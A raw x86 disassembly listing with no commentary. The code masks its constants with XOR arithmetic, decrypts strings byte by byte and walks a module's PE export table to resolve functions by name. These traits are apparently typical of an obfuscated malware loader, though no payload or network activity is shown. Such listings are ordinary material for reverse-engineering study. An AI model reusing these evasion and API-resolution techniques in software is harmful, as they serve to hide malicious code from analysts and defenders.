  427c7b:	mov    edi,0x4e3e
  427c80:	mov    DWORD PTR [ebp-0x4],edx
  427c83:	cmp    ax,di
  427c86:	je     0x427cb3
  427c88:	mov    eax,DWORD PTR [ebp+0x8]
  427c8b:	sub    eax,edx
  427c8d:	mov    DWORD PTR [ebp+0x8],eax
  427c90:	jmp    0x427c95
  427c92:	mov    eax,DWORD PTR [ebp+0x8]
  427c95:	mov    WORD PTR [edx],cx
  427c98:	add    edx,0x2
  427c9b:	movzx  edi,WORD PTR [eax+edx*1]
  427c9f:	mov    ecx,edi
  427ca1:	add    edi,0xffffc4a6
  427ca7:	xor    edi,esi
  427ca9:	mov    eax,0x4e3e
  427cae:	cmp    di,ax
  427cb1:	jne    0x427c92
  427cb3:	xor    eax,eax
  427cb5:	pop    edi
  427cb6:	mov    WORD PTR [edx],ax
  427cb9:	mov    eax,DWORD PTR [ebp-0x4]
  427cbc:	pop    esi
  427cbd:	leave  
  427cbe:	ret    0x4
  427cc1:	push   ebp
  427cc2:	mov    ebp,esp
  427cc4:	sub    esp,0x18
  427cc7:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  427cce:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  427cd5:	mov    ecx,DWORD PTR [ebp-0x8]
  427cd8:	push   esi
  427cd9:	mov    eax,0x75108aa
  427cde:	xor    ecx,eax
  427ce0:	mov    esi,0x3272f1
  427ce5:	add    ecx,esi
  427ce7:	mov    DWORD PTR [ebp-0x4],ecx
  427cea:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  427cf1:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427cf8:	push   edi
  427cf9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  427d00:	jmp    0x427da1
  427d05:	mov    ecx,DWORD PTR [ebp-0x4]
  427d08:	mov    edx,DWORD PTR [ebp+0x10]
  427d0b:	sub    edx,ecx
  427d0d:	mov    ecx,DWORD PTR [ebp-0xc]
  427d10:	xor    ecx,eax
  427d12:	add    ecx,esi
  427d14:	cmp    edx,ecx
  427d16:	jbe    0x427d33
  427d18:	mov    edx,DWORD PTR [ebp-0x4]
  427d1b:	add    edx,DWORD PTR [ebp+0x8]
  427d1e:	mov    ecx,DWORD PTR [ebp-0x4]
  427d21:	add    ecx,DWORD PTR [ebp+0xc]
  427d24:	mov    edi,DWORD PTR [ecx]
  427d26:	mov    DWORD PTR [edx],edi
  427d28:	mov    ecx,DWORD PTR [ecx+0x4]
  427d2b:	mov    DWORD PTR [edx+0x4],ecx
  427d2e:	mov    ecx,DWORD PTR [ebp-0xc]
  427d31:	jmp    0x427d80
  427d33:	mov    ecx,DWORD PTR [ebp-0x4]
  427d36:	mov    edx,DWORD PTR [ebp+0x10]
  427d39:	sub    edx,ecx
  427d3b:	mov    ecx,DWORD PTR [ebp-0x10]
  427d3e:	xor    ecx,eax
  427d40:	add    ecx,esi
  427d42:	cmp    edx,ecx
  427d44:	mov    ecx,DWORD PTR [ebp-0x4]
  427d47:	jbe    0x427d5b
  427d49:	add    ecx,DWORD PTR [ebp+0x8]
  427d4c:	mov    edx,DWORD PTR [ebp-0x4]
  427d4f:	add    edx,DWORD PTR [ebp+0xc]
  427d52:	mov    edx,DWORD PTR [edx]
  427d54:	mov    DWORD PTR [ecx],edx
  427d56:	mov    ecx,DWORD PTR [ebp-0x10]
  427d59:	jmp    0x427d80
  427d5b:	mov    edx,DWORD PTR [ebp+0x10]
  427d5e:	sub    edx,ecx
  427d60:	mov    ecx,DWORD PTR [ebp-0x14]
  427d63:	xor    ecx,eax
  427d65:	add    ecx,esi
  427d67:	cmp    edx,ecx
  427d69:	mov    ecx,DWORD PTR [ebp-0x4]
  427d6c:	jbe    0x427d91
  427d6e:	add    ecx,DWORD PTR [ebp+0x8]
  427d71:	mov    edx,DWORD PTR [ebp-0x4]
  427d74:	add    edx,DWORD PTR [ebp+0xc]
  427d77:	mov    dx,WORD PTR [edx]
  427d7a:	mov    WORD PTR [ecx],dx
  427d7d:	mov    ecx,DWORD PTR [ebp-0x14]
  427d80:	mov    edx,DWORD PTR [ebp-0x4]
  427d83:	xor    ecx,eax
  427d85:	lea    ecx,[ecx+edx*1+0x3272f1]
  427d8c:	mov    DWORD PTR [ebp-0x4],ecx
  427d8f:	jmp    0x427da1
  427d91:	add    ecx,DWORD PTR [ebp+0x8]
  427d94:	mov    edx,DWORD PTR [ebp-0x4]
  427d97:	add    edx,DWORD PTR [ebp+0xc]
  427d9a:	mov    dl,BYTE PTR [edx]
  427d9c:	mov    BYTE PTR [ecx],dl
  427d9e:	inc    DWORD PTR [ebp-0x4]
  427da1:	mov    ecx,DWORD PTR [ebp-0x18]
  427da4:	mov    edx,DWORD PTR [ebp+0x10]
  427da7:	xor    ecx,eax
  427da9:	add    ecx,esi
  427dab:	imul   ecx,edx
  427dae:	mov    edx,DWORD PTR [ebp-0x8]
  427db1:	mov    edi,DWORD PTR [ebp-0x4]
  427db4:	xor    edx,eax
  427db6:	lea    edx,[edx+edi*1+0x3272f1]
  427dbd:	cmp    edx,ecx
  427dbf:	jb     0x427d05
  427dc5:	pop    edi
  427dc6:	pop    esi
  427dc7:	leave  
  427dc8:	ret    0xc
  427dcb:	push   ebp
  427dcc:	mov    ebp,esp
  427dce:	sub    esp,0xc
  427dd1:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427dd8:	push   esi
  427dd9:	mov    esi,eax
  427ddb:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  427de2:	mov    edx,DWORD PTR [ebp-0x4]
  427de5:	mov    eax,0x75108aa
  427dea:	xor    edx,eax
  427dec:	mov    ecx,0x3272f1
  427df1:	add    edx,ecx
  427df3:	cmp    esi,edx
  427df5:	je     0x427e37
  427df7:	push   ebx
  427df8:	push   edi
  427df9:	mov    edx,DWORD PTR [ebp-0x8]
  427dfc:	mov    ebx,DWORD PTR [ebp+0x8]
  427dff:	xor    edx,eax
  427e01:	mov    edi,0xffcd8d0f
  427e06:	sub    edi,edx
  427e08:	add    esi,edi
  427e0a:	lea    edx,[esi-0x3272f1]
  427e10:	xor    edx,eax
  427e12:	mov    DWORD PTR [ebp-0xc],edx
  427e15:	mov    edx,DWORD PTR [ebp-0x4]
  427e18:	mov    edi,DWORD PTR [ebp-0xc]
  427e1b:	xor    dl,0xaa
  427e1e:	sub    dl,0xf
  427e21:	xor    edi,eax
  427e23:	mov    BYTE PTR [edi+ebx*1+0x3272f1],dl
  427e2a:	mov    edx,DWORD PTR [ebp-0x4]
  427e2d:	xor    edx,eax
  427e2f:	add    edx,ecx
  427e31:	cmp    esi,edx
  427e33:	jne    0x427df9
  427e35:	pop    edi
  427e36:	pop    ebx
  427e37:	pop    esi
  427e38:	leave  
  427e39:	ret    0x4
  427e3c:	push   ebp
  427e3d:	mov    ebp,esp
  427e3f:	sub    esp,0x21c
  427e45:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427e4c:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  427e53:	mov    eax,DWORD PTR [ebp+0x10]
  427e56:	mov    eax,DWORD PTR [ebp-0x4]
  427e59:	mov    ecx,DWORD PTR [ebp+0x8]
  427e5c:	push   esi
  427e5d:	push   edi
  427e5e:	mov    edi,0x75108aa
  427e63:	xor    eax,edi
  427e65:	mov    esi,0x3272f1
  427e6a:	add    eax,esi
  427e6c:	cmp    eax,ecx
  427e6e:	mov    eax,DWORD PTR [ebp-0x4]
  427e71:	jne    0x427e7c
  427e73:	xor    eax,edi
  427e75:	add    eax,esi
  427e77:	jmp    0x427f28
  427e7c:	mov    ecx,DWORD PTR [ebp+0xc]
  427e7f:	xor    eax,edi
  427e81:	add    eax,esi
  427e83:	cmp    eax,ecx
  427e85:	jne    0x427e8c
  427e87:	mov    eax,DWORD PTR [ebp-0x4]
  427e8a:	jmp    0x427e73
  427e8c:	lea    eax,[ebp-0x21c]
  427e92:	mov    DWORD PTR [ebp-0x8],eax
  427e95:	mov    eax,DWORD PTR [ebp+0xc]
  427e98:	mov    DWORD PTR [ebp-0x10],eax
  427e9b:	mov    eax,DWORD PTR [ebp-0x4]
  427e9e:	xor    eax,edi
  427ea0:	add    eax,esi
  427ea2:	mov    DWORD PTR [ebp+0x10],eax
  427ea5:	mov    eax,DWORD PTR [ebp+0xc]
  427ea8:	push   ebx
  427ea9:	call   0x427bd3
  427eae:	mov    ebx,eax
  427eb0:	mov    eax,DWORD PTR [ebp+0x8]
  427eb3:	mov    eax,DWORD PTR [eax+0x14]
  427eb6:	jmp    0x427f10
  427eb8:	mov    eax,DWORD PTR [ebp+0xc]
  427ebb:	sub    eax,0x8
  427ebe:	mov    DWORD PTR [ebp-0xc],eax
  427ec1:	mov    eax,DWORD PTR [ebp-0xc]
  427ec4:	mov    eax,DWORD PTR [eax+0x28]
  427ec7:	call   0x427abd
  427ecc:	mov    DWORD PTR [ebp+0x10],eax
  427ecf:	push   DWORD PTR [ebp+0x10]
  427ed2:	mov    edx,DWORD PTR [ebp-0x8]
  427ed5:	call   0x427c62
  427eda:	mov    eax,DWORD PTR [ebp-0x4]
  427edd:	xor    eax,edi
  427edf:	add    eax,esi
  427ee1:	cmp    eax,ebx
  427ee3:	jne    0x427eed
  427ee5:	mov    eax,DWORD PTR [ebp-0x8]
  427ee8:	call   0x427b4b
  427eed:	mov    eax,DWORD PTR [ebp-0x14]
  427ef0:	xor    eax,edi
  427ef2:	add    eax,esi
  427ef4:	push   eax
  427ef5:	push   DWORD PTR [ebp-0x10]
  427ef8:	mov    eax,DWORD PTR [ebp-0x8]
  427efb:	call   0x427877
  427f00:	mov    ecx,DWORD PTR [ebp-0x4]
  427f03:	xor    ecx,edi
  427f05:	add    ecx,esi
  427f07:	cmp    eax,ecx
  427f09:	je     0x427f2e
  427f0b:	mov    eax,DWORD PTR [ebp+0xc]
  427f0e:	mov    eax,DWORD PTR [eax]
  427f10:	mov    DWORD PTR [ebp+0xc],eax
  427f13:	mov    eax,DWORD PTR [ebp+0x8]
  427f16:	mov    ecx,DWORD PTR [ebp+0xc]
  427f19:	add    eax,0x14
  427f1c:	cmp    ecx,eax
  427f1e:	jne    0x427eb8
  427f20:	mov    eax,DWORD PTR [ebp-0x4]
  427f23:	xor    eax,edi
  427f25:	add    eax,esi
  427f27:	pop    ebx
  427f28:	pop    edi
  427f29:	pop    esi
  427f2a:	leave  
  427f2b:	ret    0xc
  427f2e:	mov    eax,DWORD PTR [ebp-0xc]
  427f31:	mov    eax,DWORD PTR [eax+0x18]
  427f34:	jmp    0x427f27
  427f36:	push   ebp
  427f37:	mov    ebp,esp
  427f39:	mov    eax,DWORD PTR [ebp+0xc]
  427f3c:	sub    esp,0x10
  427f3f:	cmp    DWORD PTR [ebp+0x8],0x0
  427f43:	push   ebx
  427f44:	push   esi
  427f45:	push   edi
  427f46:	je     0x427ffb
  427f4c:	test   eax,eax
  427f4e:	je     0x427ffb
  427f54:	movzx  eax,WORD PTR [eax+0x20]
  427f58:	mov    ecx,eax
  427f5a:	mov    DWORD PTR [ebp-0x10],eax
  427f5d:	xor    edx,edx
  427f5f:	and    DWORD PTR [ebp-0x8],edx
  427f62:	mov    eax,0x8a98
  427f67:	xor    ecx,eax
  427f69:	add    ecx,0x3b5a
  427f6f:	mov    DWORD PTR [ebp-0xc],ecx
  427f72:	and    DWORD PTR [ebp-0x4],0x0
  427f76:	xor    ecx,ecx
  427f78:	push   0x7d
  427f7a:	pop    edi
  427f7b:	cmp    cx,WORD PTR [ebp-0xc]
  427f7f:	jae    0x427fe5
  427f81:	lea    esi,[edx-0x3b5a]
  427f87:	xor    esi,eax
  427f89:	movzx  ecx,WORD PTR [ebp-0x4]
  427f8d:	mov    ebx,DWORD PTR [ebp+0xc]
  427f90:	lea    ecx,[ebx+ecx*4]
  427f93:	cmp    WORD PTR [ecx+0x2],si
  427f97:	jne    0x427fd0
  427f99:	movzx  ecx,WORD PTR [ecx]
  427f9c:	mov    edi,0x4e3e
  427fa1:	cmp    cx,di
  427fa4:	jne    0x427fb2
  427fa6:	mov    ebx,DWORD PTR [ebp+0x8]
  427fa9:	movzx  edi,dx
  427fac:	cmp    BYTE PTR [edi+ebx*1],0x0
  427fb0:	je     0x427fdf
  427fb2:	mov    ebx,DWORD PTR [ebp+0x8]
  427fb5:	movzx  edi,dx
  427fb8:	movsx  di,BYTE PTR [edi+ebx*1]
  427fbd:	mov    ebx,0x3b5a
  427fc2:	sub    di,bx
  427fc5:	xor    di,ax
  427fc8:	cmp    cx,di
  427fcb:	je     0x427fdf
  427fcd:	push   0xffffff83
  427fcf:	pop    edi
  427fd0:	inc    DWORD PTR [ebp-0x4]
  427fd3:	mov    cx,WORD PTR [ebp-0xc]
  427fd7:	cmp    WORD PTR [ebp-0x4],cx
  427fdb:	jb     0x427f89
  427fdd:	jmp    0x427fe5
  427fdf:	inc    DWORD PTR [ebp-0x8]
  427fe2:	push   0x7c
  427fe4:	pop    edi
  427fe5:	mov    esi,DWORD PTR [ebp+0x8]
  427fe8:	movzx  ecx,dx
  427feb:	cmp    BYTE PTR [ecx+esi*1],0x0
  427fef:	je     0x428004
  427ff1:	inc    edx
  427ff2:	cmp    edi,0xffffff83
  427ff5:	jne    0x427f72
  427ffb:	xor    eax,eax
  427ffd:	pop    edi
  427ffe:	pop    esi
  427fff:	pop    ebx
  428000:	leave  
  428001:	ret    0x8
  428004:	mov    ecx,DWORD PTR [ebp-0x8]
  428007:	add    ecx,0xffffc4a6
  42800d:	xor    cx,ax
  428010:	xor    eax,eax
  428012:	cmp    cx,WORD PTR [ebp-0x10]
  428016:	sete   al
  428019:	jmp    0x427ffd
  42801b:	push   ebp
  42801c:	mov    ebp,esp
  42801e:	sub    esp,0x50
  428021:	push   edi
  428022:	mov    edi,eax
  428024:	mov    eax,DWORD PTR [edi+0x1a8]
  42802a:	cmp    DWORD PTR [eax],0x0
  42802d:	jne    0x428036
  42802f:	xor    eax,eax
  428031:	jmp    0x428167
  428036:	push   DWORD PTR [ebp+0x8]
  428039:	push   0x2c
  42803b:	pop    eax
  42803c:	call   0x427dcb
  428041:	mov    edx,DWORD PTR [edi+0x1ac]
  428047:	lea    eax,[edi+0x22]
  42804a:	mov    DWORD PTR [ebp-0x4c],eax
  42804d:	lea    eax,[edi+0x44]
  428050:	mov    DWORD PTR [ebp-0x48],eax
  428053:	lea    eax,[edi+0x66]
  428056:	mov    DWORD PTR [ebp-0x44],eax
  428059:	lea    eax,[edi+0x88]
  42805f:	mov    DWORD PTR [ebp-0x40],eax
  428062:	lea    eax,[edi+0xaa]
  428068:	mov    DWORD PTR [ebp-0x3c],eax
  42806b:	lea    eax,[edi+0xcc]
  428071:	mov    DWORD PTR [ebp-0x38],eax
  428074:	lea    eax,[edi+0xee]
  42807a:	mov    DWORD PTR [ebp-0x34],eax
  42807d:	lea    eax,[edi+0x110]
  428083:	mov    DWORD PTR [ebp-0x30],eax
  428086:	lea    eax,[edi+0x132]
  42808c:	mov    DWORD PTR [ebp-0x2c],eax
  42808f:	lea    eax,[edi+0x154]
  428095:	push   edi
  428096:	mov    DWORD PTR [ebp-0x50],edi
  428099:	mov    DWORD PTR [ebp-0x28],eax
  42809c:	call   0x42819b
  4280a1:	push   eax
  4280a2:	mov    eax,DWORD PTR [edi+0x1a8]
  4280a8:	push   DWORD PTR [eax]
  4280aa:	call   0x427e3c
  4280af:	mov    DWORD PTR [ebp-0x10],eax
  4280b2:	test   eax,eax
  4280b4:	je     0x428167
  4280ba:	mov    ecx,DWORD PTR [eax+0x3c]
  4280bd:	push   ebx
  4280be:	push   esi
  4280bf:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  4280c3:	add    esi,eax
  4280c5:	mov    edi,DWORD PTR [esi+0x24]
  4280c8:	mov    ecx,DWORD PTR [esi+0x1c]
  4280cb:	mov    edx,DWORD PTR [esi+0x20]
  4280ce:	mov    ebx,DWORD PTR [esi+0x18]
  4280d1:	add    edi,eax
  4280d3:	mov    DWORD PTR [ebp-0x20],edi
  4280d6:	mov    edi,DWORD PTR [esi+0x14]
  4280d9:	add    ecx,eax
  4280db:	add    edx,eax
  4280dd:	mov    DWORD PTR [ebp-0xc],ecx
  4280e0:	mov    DWORD PTR [ebp-0x1c],edx
  4280e3:	mov    DWORD PTR [ebp-0x8],edi
  4280e6:	cmp    edi,ebx
  4280e8:	ja     0x4280ed
  4280ea:	mov    DWORD PTR [ebp-0x8],ebx
  4280ed:	xor    ebx,ebx
  4280ef:	mov    DWORD PTR [ebp-0x18],ebx
  4280f2:	cmp    DWORD PTR [ebp-0x8],ebx
  4280f5:	jbe    0x428165
  4280f7:	jmp    0x4280fc
  4280f9:	mov    edx,DWORD PTR [ebp-0x1c]
  4280fc:	mov    edi,DWORD PTR [ebp-0x20]
  4280ff:	movzx  edi,WORD PTR [edi+ebx*2]
  428103:	cmp    ebx,DWORD PTR [esi+0x18]
  428106:	jae    0x428165
  428108:	cmp    edi,DWORD PTR [esi+0x14]
  42810b:	jae    0x428165
  42810d:	mov    ebx,DWORD PTR [edx+ebx*4]
  428110:	mov    edx,DWORD PTR [ebp+0x8]
  428113:	mov    edi,DWORD PTR [ecx+edi*4]
  428116:	mov    DWORD PTR [ebp-0x4],edx
  428119:	lea    edx,[ebp-0x50]
  42811c:	add    ebx,eax
  42811e:	add    edi,eax
  428120:	sub    edx,DWORD PTR [ebp+0x8]
  428123:	mov    DWORD PTR [ebp-0x14],0xb
  42812a:	mov    DWORD PTR [ebp-0x24],edx
  42812d:	mov    edx,DWORD PTR [ebp-0x4]
  428130:	cmp    DWORD PTR [edx],0x0
  428133:	jne    0x428150
  428135:	mov    eax,DWORD PTR [ebp-0x24]
  428138:	push   DWORD PTR [eax+edx*1]
  42813b:	push   ebx
  42813c:	call   0x427f36
  428141:	mov    ecx,DWORD PTR [ebp-0xc]
  428144:	test   eax,eax
  428146:	je     0x42814d
  428148:	mov    eax,DWORD PTR [ebp-0x4]
  42814b:	mov    DWORD PTR [eax],edi
  42814d:	mov    eax,DWORD PTR [ebp-0x10]
  428150:	add    DWORD PTR [ebp-0x4],0x4
  428154:	dec    DWORD PTR [ebp-0x14]
  428157:	jne    0x42812d
  428159:	mov    ebx,DWORD PTR [ebp-0x18]
  42815c:	inc    ebx
  42815d:	mov    DWORD PTR [ebp-0x18],ebx
  428160:	cmp    ebx,DWORD PTR [ebp-0x8]
  428163:	jb     0x4280f9
  428165:	pop    esi
  428166:	pop    ebx
  428167:	pop    edi
  428168:	leave  
  428169:	ret    0x4
  42816c:	push   ebp
  42816d:	mov    ebp,esp
  42816f:	mov    eax,DWORD PTR [ebp+0x8]
  428172:	push   esi
  428173:	push   DWORD PTR [eax+0x1e0]
  428179:	lea    esi,[eax+0x198]
  42817f:	mov    eax,DWORD PTR [ebp+0x8]
  428182:	call   0x42801b
  428187:	mov    ecx,DWORD PTR [esi]
  428189:	mov    DWORD PTR [ecx],eax
  42818b:	mov    eax,DWORD PTR [esi]
  42818d:	xor    ecx,ecx
  42818f:	cmp    DWORD PTR [eax],ecx
  428191:	pop    esi
  428192:	setne  cl
  428195:	mov    eax,ecx
  428197:	pop    ebp
  428198:	ret    0x4
  42819b:	mov    ecx,DWORD PTR [edi+0x188]
  4281a1:	push   ebx
  4281a2:	jmp    0x4281b7
  4281a4:	xor    eax,0x8a98
  4281a9:	add    eax,0x3b5a
  4281ae:	mov    WORD PTR [ecx],ax
  4281b1:	add    ecx,0x2
  4281b4:	add    edx,0x2
  4281b7:	movzx  eax,WORD PTR [edx]
  4281ba:	mov    ebx,0x4e3e
  4281bf:	cmp    ax,bx
  4281c2:	jne    0x4281a4
  4281c4:	xor    eax,eax
  4281c6:	mov    WORD PTR [ecx],ax
  4281c9:	mov    eax,DWORD PTR [edi+0x188]
  4281cf:	pop    ebx
  4281d0:	ret    
  4281d1:	push   edi
  4281d2:	mov    edi,eax
  4281d4:	mov    eax,DWORD PTR [esi+0x188]
  4281da:	shl    edi,0x6
  4281dd:	add    eax,edi
  4281df:	jmp    0x4281ea
  4281e1:	xor    cl,0x7c
  4281e4:	inc    cl
  4281e6:	mov    BYTE PTR [eax],cl
  4281e8:	inc    eax
  4281e9:	inc    edx
  4281ea:	mov    cl,BYTE PTR [edx]
  4281ec:	cmp    cl,0x83
  4281ef:	jne    0x4281e1
  4281f1:	mov    BYTE PTR [eax],0x0
  4281f4:	mov    eax,DWORD PTR [esi+0x188]
  4281fa:	add    eax,edi
  4281fc:	pop    edi
  4281fd:	ret    
  4281fe:	push   ebp
  4281ff:	mov    ebp,esp
  428201:	sub    esp,0x14
  428204:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42820b:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  428212:	mov    eax,DWORD PTR [ebx]
  428214:	mov    DWORD PTR [ebp-0x8],eax
  428217:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42821e:	push   esi
  42821f:	push   edi
  428220:	mov    DWORD PTR [ebp-0x14],0xead71885
  428227:	mov    edi,DWORD PTR [ebp-0x4]
  42822a:	mov    ecx,DWORD PTR [ebp-0x10]
  42822d:	mov    eax,0x75108aa
  428232:	xor    edi,eax
  428234:	mov    edx,0x3272f1
  428239:	xor    ecx,eax
  42823b:	add    edi,edx
  42823d:	add    ecx,edx
  42823f:	imul   edi,ecx
  428242:	jmp    0x42828a
  428244:	mov    ecx,DWORD PTR [ebp-0x8]
  428247:	mov    esi,DWORD PTR [ebp-0x4]
  42824a:	xor    ecx,eax
  42824c:	xor    esi,eax
  42824e:	add    ecx,edx
  428250:	add    esi,edx
  428252:	test   esi,ecx
  428254:	mov    esi,DWORD PTR [ebp-0x8]
  428257:	mov    ecx,DWORD PTR [ebp-0x4]
  42825a:	je     0x428271
  42825c:	xor    ecx,eax
  42825e:	xor    esi,eax
  428260:	add    ecx,edx
  428262:	add    esi,edx
  428264:	shr    esi,cl
  428266:	mov    ecx,DWORD PTR [ebp-0x14]
  428269:	xor    ecx,eax
  42826b:	add    ecx,edx
  42826d:	xor    esi,ecx
  42826f:	jmp    0x42827b
  428271:	xor    esi,eax
  428273:	xor    ecx,eax
  428275:	add    esi,edx
  428277:	add    ecx,edx
  428279:	shr    esi,cl
  42827b:	mov    DWORD PTR [ebp-0x8],esi
  42827e:	mov    ecx,DWORD PTR [ebp-0x4]
  428281:	xor    ecx,eax
  428283:	lea    edi,[edi+ecx*1+0x3272f1]
  42828a:	mov    ecx,DWORD PTR [ebp-0xc]
  42828d:	mov    esi,DWORD PTR [ebp-0x4]
  428290:	xor    esi,eax
  428292:	xor    ecx,eax
  428294:	sub    ecx,esi
  428296:	cmp    edi,ecx
  428298:	jbe    0x428244
  42829a:	mov    eax,DWORD PTR [ebp-0x8]
  42829d:	pop    edi
  42829e:	mov    DWORD PTR [ebx],eax
  4282a0:	mov    eax,DWORD PTR [ebp-0x8]
  4282a3:	pop    esi
  4282a4:	leave  
  4282a5:	ret    
  4282a6:	push   ebp
  4282a7:	mov    ebp,esp
  4282a9:	sub    esp,0x38
  4282ac:	push   ebx
  4282ad:	mov    ebx,0xf89c85a5
  4282b2:	mov    DWORD PTR [ebp-0x4],ebx
  4282b5:	lea    ecx,[ebx+0x15]
  4282b8:	mov    DWORD PTR [ebp-0x24],ecx
  4282bb:	mov    eax,DWORD PTR [ebp-0x4]
  4282be:	mov    edx,DWORD PTR [ebp+0x8]
  4282c1:	push   esi
  4282c2:	mov    esi,0x75108aa
  4282c7:	xor    eax,esi
  4282c9:	push   edi
  4282ca:	mov    edi,0x3272f1
  4282cf:	add    eax,edi
  4282d1:	cmp    edx,eax
  4282d3:	mov    eax,DWORD PTR [ebp-0x4]
  4282d6:	je     0x42843a
  4282dc:	mov    edx,DWORD PTR [ebp+0xc]
  4282df:	xor    eax,esi
  4282e1:	add    eax,edi
  4282e3:	cmp    edx,eax
  4282e5:	je     0x428437
  4282eb:	mov    eax,DWORD PTR [ebp+0x10]
  4282ee:	mov    edx,DWORD PTR [ebp+0xc]
  4282f1:	mov    DWORD PTR [ebp-0x14],eax
  4282f4:	mov    eax,DWORD PTR [ebp+0x8]
  4282f7:	mov    DWORD PTR [ebp-0x18],0xf89c853f
  4282fe:	mov    DWORD PTR [ebp-0xc],eax
  428301:	lea    eax,[ebx+0x16]
  428304:	mov    DWORD PTR [ebp-0x1c],eax
  428307:	mov    DWORD PTR [ebp-0x10],ebx
  42830a:	mov    DWORD PTR [ebp+0xc],ecx
  42830d:	mov    DWORD PTR [ebp+0x10],eax
  428310:	mov    eax,DWORD PTR [ebp+0xc]
  428313:	xor    eax,esi
  428315:	mov    DWORD PTR [ebp-0x20],edx
  428318:	sub    edx,eax
  42831a:	sub    edx,edi
  42831c:	mov    DWORD PTR [ebp+0x8],edx
  42831f:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428326:	jmp    0x428427
  42832b:	mov    eax,DWORD PTR [ebp+0xc]
  42832e:	mov    ecx,DWORD PTR [ebp+0xc]
  428331:	xor    eax,esi
  428333:	xor    ecx,esi
  428335:	lea    ecx,[eax+ecx*1+0x64e5e2]
  42833c:	mov    eax,DWORD PTR [ebp+0x8]
  42833f:	xor    edx,edx
  428341:	div    ecx
  428343:	mov    eax,DWORD PTR [ebp+0x10]
  428346:	mov    ecx,DWORD PTR [ebp+0xc]
  428349:	xor    eax,esi
  42834b:	xor    ecx,esi
  42834d:	sub    eax,ecx
  42834f:	cmp    edx,eax
  428351:	jne    0x4283e6
  428357:	mov    eax,DWORD PTR [ebp+0x8]
  42835a:	mov    ecx,DWORD PTR [ebp-0xc]
  42835d:	mov    dl,BYTE PTR [eax+ecx*1]
  428360:	mov    eax,DWORD PTR [ebp-0x10]
  428363:	mov    ecx,DWORD PTR [ebp-0x8]
  428366:	xor    eax,esi
  428368:	xor    ecx,esi
  42836a:	add    eax,edi
  42836c:	add    ecx,edi
  42836e:	cmp    eax,ecx
  428370:	jae    0x4283b8
  428372:	lea    ecx,[eax-0x3272f1]
  428378:	mov    DWORD PTR [ebp-0x4],ecx
  42837b:	mov    ebx,DWORD PTR [ebp-0x4]
  42837e:	xor    ebx,esi
  428380:	add    ebx,0x7f55d8fb
  428386:	lea    ecx,[ebp+eax*4-0x38]
  42838a:	mov    DWORD PTR [ecx],ebx
  42838c:	mov    ebx,DWORD PTR [ecx]
  42838e:	cmp    ebx,0x244ecb98
  428394:	jbe    0x42839e
  428396:	add    DWORD PTR [ecx],0x405fcd9
  42839c:	jmp    0x4283a4
  42839e:	add    DWORD PTR [ecx],0xfdaf4327
  4283a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4283a7:	xor    ecx,esi
  4283a9:	inc    eax
  4283aa:	inc    DWORD PTR [ebp-0x4]
  4283ad:	add    ecx,edi
  4283af:	cmp    eax,ecx
  4283b1:	jb     0x42837b
  4283b3:	mov    ebx,0xf89c85a5
  4283b8:	cmp    DWORD PTR [ebp-0x14],0x0
  4283bc:	jne    0x4283c5
  4283be:	xor    dl,0x7c
  4283c1:	inc    dl
  4283c3:	jmp    0x4283db
  4283c5:	mov    eax,DWORD PTR [ebp-0x18]
  4283c8:	xor    al,0xaa
  4283ca:	mov    cl,0xf
  4283cc:	sub    cl,al
  4283ce:	add    dl,cl
  4283d0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4283d3:	xor    cl,0xaa
  4283d6:	sub    cl,0xf
  4283d9:	ror    dl,cl
  4283db:	xor    eax,eax
  4283dd:	mov    eax,DWORD PTR [ebp+0x8]
  4283e0:	mov    ecx,DWORD PTR [ebp-0xc]
  4283e3:	mov    BYTE PTR [eax+ecx*1],dl
  4283e6:	mov    eax,DWORD PTR [ebp+0x8]
  4283e9:	mov    ecx,DWORD PTR [ebp-0x10]
  4283ec:	sub    eax,edi
  4283ee:	xor    eax,esi
  4283f0:	cmp    eax,ecx
  4283f2:	jne    0x428415
  4283f4:	mov    eax,DWORD PTR [ebp+0x10]
  4283f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4283fa:	xor    eax,esi
  4283fc:	xor    ecx,esi
  4283fe:	sub    eax,ecx
  428400:	mov    ecx,DWORD PTR [ebp-0x20]
  428403:	sub    eax,edi
  428405:	xor    eax,esi
  428407:	mov    DWORD PTR [ebp+0x10],eax
  42840a:	mov    eax,DWORD PTR [ebp+0xc]
  42840d:	xor    eax,esi
  42840f:	sub    ecx,eax
  428411:	sub    ecx,edi
  428413:	jmp    0x428424
  428415:	mov    eax,DWORD PTR [ebp+0xc]
  428418:	xor    eax,esi
  42841a:	mov    ecx,0xffcd8d0f
  42841f:	sub    ecx,eax
  428421:	add    ecx,DWORD PTR [ebp+0x8]
  428424:	mov    DWORD PTR [ebp+0x8],ecx
  428427:	mov    eax,DWORD PTR [ebp+0x10]
  42842a:	cmp    eax,ebx
  42842c:	jne    0x42832b
  428432:	mov    eax,DWORD PTR [ebp-0x24]
  428435:	jmp    0x42843a
  428437:	mov    eax,DWORD PTR [ebp-0x4]
  42843a:	xor    eax,esi
  42843c:	add    eax,edi
  42843e:	pop    edi
  42843f:	pop    esi
  428440:	pop    ebx
  428441:	leave  
  428442:	ret    0xc
  428445:	push   ebp
  428446:	mov    ebp,esp
  428448:	sub    esp,0x420
  42844e:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  428455:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  42845c:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  428463:	push   ebx
  428464:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  42846b:	mov    eax,DWORD PTR [ebp-0x14]
  42846e:	push   esi
  42846f:	mov    esi,0x75108aa
  428474:	push   edi
  428475:	xor    eax,esi
  428477:	mov    edi,0x3272f1
  42847c:	add    eax,edi
